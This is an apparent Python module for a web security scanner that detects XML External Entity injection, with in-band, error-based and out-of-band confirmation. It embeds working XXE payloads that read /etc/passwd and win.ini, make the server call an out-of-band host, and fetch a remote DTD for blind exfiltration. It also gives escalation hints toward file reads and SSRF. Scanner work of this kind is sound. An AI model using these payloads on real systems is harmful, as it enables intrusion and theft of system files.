"""
XXEScanner — XML External Entity injection detection with OOB confirmation.

Lifecycle:
  DETECTED:   (not applicable)
  VALIDATED:  In-band or error-based XXE returns file content
  EXPLOITABLE: (not applicable)
  VERIFIED:   OOB callback confirms blind XXE execution

Maturity: Level 4 (OOB-confirmed)
"""

from modules.utils import (
    safe_post, finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult
from models.finding import Finding
from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
]


class XXEScanner(ScannerBase):
    SCANNER_NAME = "xxe"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        xml_headers = {"Content-Type": "application/xml"}
        xxe_payloads = self._load_payloads("xxe")

        for payload in xxe_payloads.get("in_band", XXE_PAYLOADS.get("in_band", [])):
            try:
                resp = safe_post(self.session, url, payload, self.timeout, headers=xml_headers)
                if not resp:
                    continue
                body = resp.text
                for sig in XXE_SIGNATURES:
                    if sig in body:
                        return DetectionResult(
                            url=url,
                            parameter="POST body",
                            payload=payload,
                            context=f"in_band:{sig}",
                            raw_response=resp,
                            evidence_signals=[f"in_band:{sig}"],
                        )
            except Exception:
                continue

        for payload in xxe_payloads.get("error_based", XXE_PAYLOADS.get("error_based", [])):
            try:
                resp = safe_post(self.session, url, payload, self.timeout, headers=xml_headers)
                if not resp:
                    continue
                body = resp.text
                for sig in XXE_SIGNATURES:
                    if sig in body:
                        return DetectionResult(
                            url=url,
                            parameter="POST body",
                            payload=payload,
                            context=f"error:{sig}",
                            raw_response=resp,
                            evidence_signals=[f"error:{sig}"],
                        )
            except Exception:
                continue

        return None

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        from scanners.base import ValidationResult
        return ValidationResult(
            confirmed=True,
            signals=detection.evidence_signals,
            method=detection.context.split(":")[0],
            detail=detection.context,
        )

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: ValidationResult | None = None) -> list:
        ev_list = []
        resp = detection.raw_response
        if resp:
            req_ev = HttpRequestEvidence(
                method="POST",
                url=detection.url,
                curl_command=_build_curl("POST", detection.url, dict(self.session.headers), data=detection.payload, cookies=safe_cookies_dict(self.session.cookies)),
            )
            resp_ev = ResponseExcerptEvidence(
                excerpt=resp.text[:500],
                length=len(resp.text),
                context="xxe_detection",
            )
            ev_list.extend([req_ev, resp_ev])
        return ev_list

    def generate_reproduction(self, detection: DetectionResult,
                              validation_result: ValidationResult | None = None) -> list[str]:
        sig = detection.context.split(":")[1] if ":" in detection.context else detection.context
        return [
            f"Send POST request to {detection.url} with Content-Type: application/xml and an XXE payload containing an external entity",
            f"Observe in response: {sig!r} — file content returned from server-side entity resolution",
            "This confirms the XML parser processes external entities without restriction",
        ]

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.validation.callback_host if self.validation else ""
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        xml_headers = {"Content-Type": "application/xml"}
        xxe_payloads = self._load_payloads("xxe")

        for url in urls:
            if not self._in_scope(url):
                continue
            signals = {"in_band": False, "error": False}

            detection = self.detect(url)
            if detection is not None:
                validation_result = self.validate(detection)
                evidence_list = self.collect_evidence(detection, validation_result)
                is_error = detection.context.startswith("error")
                signals["error" if is_error else "in_band"] = True

                for ev in evidence_list:
                    self.evidence_engine.store(ev)

                f = finding(
                    vuln_type="XML External Entity (XXE) Injection",
                    url=url, severity="critical",
                    details="In-band XXE: file content returned in response via XML entity" if not is_error
                            else "Error-based XXE: file content leaked via parser error message",
                    evidence=f"Signature: {detection.evidence_signals[0] if detection.evidence_signals else ''}",
                    request=_build_curl("POST", url, dict(self.session.headers), data=detection.payload, cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=detection.raw_response.text[:500] if detection.raw_response else "",
                    steps_to_reproduce=self.generate_reproduction(detection, validation_result),
                    verification_stage=VerificationStage.VALIDATED.value,
                )
                if f:
                    for ev in evidence_list:
                        self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                    self._add_finding(f)
                log(f"  [XXE{' Error' if is_error else ''}] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)

            if oob_host and not signals["in_band"] and not signals["error"]:
                for payload in xxe_payloads.get("oob", XXE_PAYLOADS.get("oob", [])):
                    try:
                        formatted = payload.replace("{oob}", self.validation.callback_host) if self.validation else payload.replace("{oob}", "x.oob")
                        safe_post(self.session, url, formatted, self.timeout, headers=xml_headers, raise_for_status=False)
                        self.validation.register_oob("xxe", formatted, url)
                        self._oob_registrations.append(("xxe", formatted, url))
                    except Exception:
                        continue

        return self._get_findings()

    def finalize(self) -> list[Finding]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="XML External Entity (XXE) Injection",
                url=url_str,
                severity="critical",
                details="Blind XXE confirmed via OOB callback — server parsed XML entity and made external request",
                evidence=f"Callback: {(ev.raw_data or '')[:200]}",
                request=_build_curl("POST", url_str, dict(self.session.headers), data="(XXE payload with OOB DTD)", cookies=safe_cookies_dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                response_excerpt="(XXE confirmed via out-of-band callback — XML parser made external request)",
                steps_to_reproduce=[
                    f"Send POST request to {url_str} with Content-Type: application/xml and an OOB XXE payload pointing to an attacker-controlled host",
                    "Observe OOB callback — the XML parser made an external request, confirming blind XXE",
                    f"Escalate: use XXE to read local files via parameter entities (file:///etc/passwd) or SSRF to internal services",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._add_finding(f)
                extra.append(f)
            log(f"  [XXE OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra
